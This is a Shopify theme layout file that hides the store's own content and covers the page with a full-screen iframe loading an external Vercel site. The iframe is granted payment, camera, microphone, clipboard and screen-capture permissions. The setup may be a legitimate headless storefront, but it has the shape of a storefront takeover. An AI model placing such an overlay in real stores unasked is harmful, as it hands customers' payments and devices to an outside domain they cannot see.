<!doctype html>
<html lang="{{ request.locale.iso_code }}">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
    <title>{{ page_title }}{% if current_tags %} &ndash; tagged "{{ current_tags | join: ', ' }}"{% endif %}{% if current_page != 1 %} &ndash; Page {{ current_page }}{% endif %}{% unless page_title contains shop.name %} &ndash; {{ shop.name }}{% endunless %}</title>
    {{ content_for_header }}
    
    <!-- SparkZen Production Global CSS Fallback -->
    <link rel="stylesheet" href="https://site-ready-build.vercel.app/assets/styles-B51ySHAT.css" id="sparkzen-prod-css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap">

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      html, body {
        width: 100%;
        height: 100%;
        min-height: 100dvh;
        overflow: hidden;
        background-color: #0b0b0b;
        color: #ffffff;
        font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
        -webkit-tap-highlight-color: transparent;
      }
      #store-frame {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        height: 100dvh;
        border: none;
        outline: none;
        display: block;
        z-index: 999999;
        background-color: #0b0b0b;
        -webkit-overflow-scrolling: touch;
      }
    </style>
  </head>
  <body>
    <iframe
      id="store-frame"
      src="https://site-ready-build.vercel.app"
      allow="autoplay; payment; microphone; camera; clipboard-write; display-capture"
    ></iframe>
    <script>
      (function() {
        var iframe = document.getElementById('store-frame');
        if (iframe) {
          var targetPath = window.location.pathname + window.location.search + window.location.hash;
          var targetUrl = "https://site-ready-build.vercel.app" + (targetPath || "");
          if (iframe.src !== targetUrl) {
            iframe.src = targetUrl;
          }
        }
      })();
    </script>
    <div style="display:none;">
      {{ content_for_layout }}
    </div>
  </body>
</html>
